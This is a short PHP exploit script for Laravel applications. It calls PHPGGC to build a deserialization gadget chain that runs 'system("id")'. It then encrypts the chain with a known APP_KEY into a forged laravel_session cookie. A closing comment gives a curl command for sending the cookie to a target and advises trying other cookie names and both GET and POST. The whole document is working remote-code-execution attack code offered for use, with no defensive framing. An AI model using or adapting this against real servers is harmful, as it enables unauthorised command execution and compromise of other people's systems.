<?php
$cipher = 'AES-256-CBC';
$app_key = 'base64:*********F0=';
$chain_name = 'Laravel/RCE6';
$payload = 'system("id");';

// Use PHPGGC to generate the gadget chain
$chain = shell_exec('./phpggc/phpggc '.$chain_name.' "'.$payload.'"');
// Key can be stored as base64 or string.
if( explode(":", $app_key)[0] === 'base64' ) {
        $app_key = base64_decode(explode(':', $app_key)[1]);
}
// Create cookie
$iv = random_bytes(openssl_cipher_iv_length($cipher));
$value = \openssl_encrypt($chain, $cipher, $app_key, 0, $iv);
$iv = base64_encode($iv);
$mac = hash_hmac('sha256', $iv.$value, $app_key);
$json = json_encode(compact('iv', 'value', 'mac'));

// Print the results
die(urlencode(base64_encode($json)));

# execute the command below. laravel_session might be something else, try all. Send also both post and get requests
# curl -H "Cookie: laravel_session=$(php foo.php);" -v http://example.com

